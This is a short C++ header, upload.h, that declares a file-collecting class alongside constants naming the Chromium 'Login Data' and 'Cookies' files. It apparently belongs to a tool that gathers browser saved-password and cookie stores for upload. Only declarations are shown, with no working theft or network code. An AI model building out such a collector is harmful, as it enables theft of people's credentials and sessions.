#ifndef UPLOAD_H
#define UPLOAD_H

#include "../include/lib.h"
#include "get-directory.h"
#include <vector>

namespace up {
    static std::string LOGIN_DATA = "Login Data";
    static std::string COOKIES = "Cookies";
    static const char* EXT[] = { ".ico", ".png", "README.md" };

    class fldir {
        private:
            std::filesystem::path dirPath;
        public:
            fldir() = default;
            fldir(std::filesystem::path dPath){
                dirPath = dPath;
            }
            ~fldir() = default;
            std::vector<std::filesystem::path> fVec;
            void add_files(std::filesystem::path fPath);
            void find_files();
            void find_file_path(const std::filesystem::path& fpath);
            bool rExt(const std::filesystem::path& path);
    };
}

#endif